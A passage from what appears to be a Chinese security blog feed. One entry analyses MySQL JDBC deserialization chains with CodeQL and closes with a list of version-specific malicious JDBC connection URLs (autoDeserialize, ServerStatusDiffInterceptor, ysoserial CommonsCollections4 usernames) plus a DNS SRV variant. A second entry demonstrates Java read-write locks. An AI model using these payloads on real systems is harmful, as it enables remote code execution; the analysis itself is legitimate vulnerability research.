class="line"></span><br><span class="line"><span class="keyword">from</span> Sink sink,GetConnection source</span><br><span class="line"><span class="keyword">where</span> edges<span class="operator">*</span>(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Sink is reached from $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>有4条path，分别是</p><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><p>但是他只会显示一条路径，所以要继续分析的话，就要继续更改source，改为<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;getInstance&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;ConnectionImpl&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><h2 id="createProxyInstance"><a href="#createProxyInstance" class="headerlink" title="createProxyInstance"></a>createProxyInstance</h2><p><code>getInstance</code>这条链子就是网上大部分讲的东西，但是刚刚那层<code>connect</code>为source的结果还有几个proxy的函数就引起了我的注意，在这节就用<code>createProxyInstance</code>作为例子去分析。</p><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><p>可以看到，在getInstance前面多了几个步骤，这里源码调试<br><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>可以看到有很多协议头，这里应该首先去官网或者google搜索该协议，而不是去调试代码<br>这里搜到了</p><p><a href="https://dev.mysql.com/doc/connector-j/8.1/en/connector-j-reference-dns-srv.html">https://dev.mysql.com/doc/connector-j/8.1/en/connector-j-reference-dns-srv.html</a></p><p><code>mysqlx+srv://johndoe:secret@_mysql._tcp.mycompany.local/db?xdevapi.dns-srv=true</code><br>通过该payload，可以通过dns srv记录去攻击</p><blockquote><p>DNS SRV就是记录 domain对应的ip，而且还能记录下port</p></blockquote><p>但是这里就不搭建dns服务器了，至此就分析完毕了</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一节记录一下常用的payload</p><h2 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h2><h3 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19-5.1.28"></a>5.1.19-5.1.28</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29-5.1.40"></a>5.1.29-5.1.40</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-41-5-1-48"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="6-0-2-6-0-6"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h2 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h2><h3 id="5-1-0-5-1-10"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="comment">//执行查询操作，返回的是数据库结果集的数据表</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure><h3 id="5-1-11-5-x-xx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;网上大部分都是直接分析JDBC的过程，我这里就不赘述了，这里说一下用codeql分析的思路&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="codeql" scheme="http://example.com/categories/codeql/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="codeql" scheme="http://example.com/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>读写锁</title>
    <link href="http://example.com/2023/10/06/%E8%AF%BB%E5%86%99%E9%94%81/"/>
    <id>http://example.com/2023/10/06/%E8%AF%BB%E5%86%99%E9%94%81/</id>
    <published>2023-10-06T13:13:27.000Z</published>
    <updated>2023-10-07T00:21:32.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>调试JDBC反序列化的时候，里面有这种操作，有点好奇就来看看<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ConnectionUrl <span class="title function_">getConnectionUrlInstance</span><span class="params">(String connString, Properties info)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (connString == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.0&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">connStringCacheKey</span> <span class="operator">=</span> buildConnectionStringCacheKey(connString, info);</span><br><span class="line">        ConnectionUrl connectionUrl;</span><br><span class="line"></span><br><span class="line">        rwLock.readLock().lock();</span><br><span class="line">        connectionUrl = connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">        <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">            rwLock.readLock().unlock();</span><br><span class="line">            rwLock.writeLock().lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Check again, in the meantime it could have been cached by another thread.</span></span><br><span class="line">                connectionUrl = connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">                <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">ConnectionUrlParser</span> <span class="variable">connStrParser</span> <span class="operator">=</span> ConnectionUrlParser.parseConnectionString(connString);</span><br><span class="line">                    connectionUrl = Type.getConnectionUrlInstance(connStrParser, info);</span><br><span class="line">                    connectionUrlCache.put(connStringCacheKey, connectionUrl);</span><br><span class="line">                &#125;</span><br><span class="line">                rwLock.readLock().lock();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                rwLock.writeLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        rwLock.readLock().unlock();</span><br><span class="line">        <span class="keyword">return</span> connectionUrl;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantReadWriteLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">data</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">ReentrantReadWriteLock</span> <span class="variable">rwl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rwl.readLock().lock();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read second value:&quot;</span>+data);</span><br><span class="line">            rwl.readLock().unlock();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rwl.writeLock().lock();</span><br><span class="line">            data = Math.random();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----write first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            rwl.writeLock().unlock();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainReadWritLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ReadWriteLockTest</span> <span class="variable">rwlt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReadWriteLockTest</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                    rwlt.get();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                    rwlt.put();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">----Thread:Thread-0----read first value:0.0</span><br><span class="line">----Thread:Thread-3----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read first value:0.0</span><br><span class="line">----Thread:Thread-2----read first value:0.0</span><br><span class="line">----Thread:Thread-1----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read second value:0.0</span><br><span class="line">----Thread:Thread-1----read second value:0.0</span><br><span class="line">----Thread:Thread-0----read second value:0.0</span><br><span class="line">----Thread:Thread-2----read second value:0.0</span><br><span class="line">----Thread:Thread-3----read second value:0.0</span><br><span class="line">----Thread:Thread-5----write first value:0.38882443875894124</span><br><span class="line">----Thread:Thread-6----write first value:0.537279172993168</span><br></pre></td></tr></table></figure><br>可以看到，在<code>read second value</code>这一段结束了，才开始write的操作，也就是说在没有释放<code>readlock</code>的时候,<code>writelock</code>是锁着的，也就是 <strong>读读不互斥，写写不互斥，读写有互斥</strong><br>如果把锁注释，也就是下面的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantReadWriteLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">data</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">ReentrantReadWriteLock</span> <span class="variable">rwl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read second value:&quot;</span>+data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = Math.random();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----write first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>结果如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">----Thread:Thread-2----read first value:0.0</span><br><span class="line">----Thread:Thread-3----read first value:0.0</span><br><span class="line">----Thread:Thread-0----read first value:0.0</span><br><span class="line">----Thread:Thread-1----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read first value:0.0</span><br><span class="line">----Thread:Thread-5----write first value:0.7311360215541859</span><br><span class="line">----Thread:Thread-6----write first value:0.32755079667745735</span><br><span class="line">----Thread:Thread-0----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-1----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-3----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-2----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-4----read second value:0.32755079667745735</span><br></pre></td></tr></table></figure><br>可以看到write写到中间了</p><h1 id="getConnectionUrlInstance"><a href="#getConnectionUrlInstance" class="headerlink" title="getConnectionUrlInstance"></a>getConnectionUrlInstance</h1><p>回到开头的代码，可以发现这里是在读取缓存的时候加锁，读完了就释放，然后在加上写锁，往缓存列表放入URL</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;调试JDBC反序列化的时候，里面有这种操作，有点好奇就来看看&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="多线程" scheme="http://example.com/categories/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="thread" scheme="http://example.com/tags/thread/"/>
    
  </entry>
  
  <entry>
    <title>刷题2</title>
    <link href="http://example.com/2023/10/02/%E5%88%B7%E9%A2%982/"/>
    <id>http://example.com/2023/10/02/%E5%88%B7%E9%A2%982/</id>
    <published>2023-10-02T07:33:28.000Z</published>
    <updated>2023-10-11T13:41:30.855Z</updated>
    
